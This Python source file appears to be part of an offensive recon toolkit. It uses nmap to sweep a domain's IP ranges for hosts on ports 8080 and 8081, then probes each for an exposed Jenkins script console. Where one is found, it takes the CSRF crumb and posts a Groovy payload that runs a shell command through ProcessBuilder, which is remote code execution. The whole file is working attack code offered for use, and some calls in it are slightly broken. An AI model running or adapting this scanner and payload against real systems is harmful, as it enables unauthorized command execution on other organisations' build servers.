import sys
import re
import requests
import requests.cookies
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from time import sleep
from GlobalVariables import *

class FindJenkins(object):
	def __init__(self):
		super(FindJenkins, self).__init__()
		self.globalVariables=GlobalVariables()
		self.session = requests.Session()

	def GetUser(self,IP,PORT,FILE,CRUMB):
		URL = "http://"+IP+":"+PORT+""+FILE+""
		paramsPost = {"Jenkins-Crumb":""+CRUMB+"","json":"{\"script\": \"println new ProcessBuilder(\\\"sh\\\",\\\"-c\\\",\\\"whoami\\\").redirectErrorStream(true).start().text\", \"\": \"\\\"\", \"Jenkins-Crumb\": \"4aa6395666702e283f9f3727c4a6df12\"}","Submit":"Run","script":"println new ProcessBuilder(\"sh\",\"-c\",\"whoami\").redirectErrorStream(true).start().text"}
		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Referer":URL,"Content-Type":"application/x-www-form-urlencoded"}
		response = self.session.post(URL, data=paramsPost, headers=headers, timeout=15, verify=False)
		result = response.text
		user = re.compile('<h2>Result</h2><pre>(.+?)\n').findall(response.text)[0]
		return user

	def TestJenkins(self, IP,PORT):
		FILE="/script"
		URL = "http://"+IP+":"+PORT+""+FILE+""
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
		response = self.session.get(URL, headers=headers, timeout=15, verify=False)
		if "Jenkins" in response.text:
			print ("found")
			if 'Jenkins-Crumb' in response.text:
				CRUMB = re.compile('Jenkins-Crumb", "(.+?)"').findall(response.text)[0]
				GetUser(IP,PORT,FILE,CRUMB)
			else:
				GetUser(IP,PORT,FILE,"")
		else:
			print ("Not Found")	

	def EnumerateIPToFindJenkins(self, domain):
		outUpIP="{}{}/{}".format(self.globalVariables.outputDir, domain, "upIP.txt")
		outUpIPWithPort="{}{}/{}".format(self.globalVariables.outputDir, domain, "upIPWithPort.txt")
		outIPv4Ranges="{}{}/{}".format(self.globalVariables.outputDir, domain, "ipv4ranges.txt")
		self.globalVariables.CommandExecutor("nmap -sP -iL {} | grep -E -o '([0-9]{{1,3}}[\\.]){{3}}[0-9]{{1,3}}' > {}".format(outIPv4Ranges, outUpIP))
		self.globalVariables.CommandExecutor("nmap -p8080,8081 -iL {} | grep -E -o '([0-9]{{1,3}}[\\.]){{3}}[0-9]{{1,3}}' | sort | uniq > {}".format(outUpIP, outUpIPWithPort))

		#self.outIPv6Ranges="{}{}/{}".format(self.globalVariables.outputDir, domain, "ipv6ranges.txt")
		
		upHostFile = open(outUpIPWithPort, "r")
		for host in upHostFile:
			try:
				self.TestJenkins(host.strip(), '8080')
			except: 
				print (host.strip() + ": Not find")

			try:
				self.TestJenkins(host.strip(), '8081')
			except:
				print (host.strip() + ": Not find")